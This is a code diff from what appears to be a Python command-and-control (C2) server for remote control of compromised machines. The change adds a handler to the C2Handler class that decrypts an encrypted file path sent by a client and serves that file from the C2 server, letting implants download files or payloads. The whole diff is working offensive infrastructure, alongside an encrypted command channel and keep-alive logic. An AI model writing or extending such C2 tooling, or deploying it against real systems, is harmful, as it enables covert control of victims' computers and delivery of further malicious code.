@@ -6,7 +6,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
 from crypt import cipher
 from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
-    CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+    CWD_RESPONSE, FILE_REQUEST, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 from inputimeout import inputimeout, TimeoutOccurred
 
 def get_new_session():
@@ -88,6 +88,17 @@ class C2Handler(BaseHTTPRequestHandler):
             else:
                 # first send back 404 to the client
                 self.http_response(HTTPStatusCode.NOT_FOUND.value)
+        elif self.path.startswith(FILE_REQUEST):
+            filepath = self.path.split(FILE_REQUEST)[1]
+            filepath = cipher.decrypt(filepath.encode()).decode()
+
+            try:
+                with open(f"{filepath}", "rb") as file_handle:
+                    self.http_response(HTTPStatusCode.OK)
+                    self.wfile.write(file_handle.read())
+            except (FileNotFoundError, OSError):
+                print(f"{filepath} was not found on the c2 server.")
+                self.http_response(HTTPStatusCode.NOT_FOUND)
 
     def do_POST(self):
         if self.path == RESPONSE_PATH:
